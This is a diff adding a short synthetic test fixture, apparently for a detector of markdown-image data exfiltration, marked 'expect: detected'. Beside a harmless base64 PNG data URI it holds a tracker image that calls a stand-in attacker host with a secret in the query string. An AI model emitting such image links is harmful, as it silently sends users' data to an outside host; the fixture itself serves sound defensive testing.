@@ -1,0 +1,8 @@
+---
+why: a legitimate-looking data URI next to a real exfiltration URL
+source: synthetic
+expect: detected
+---
+![logo](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==)
+
+![tracker](https://pixel.attacker.example/t?d=exfiltrated_secret)
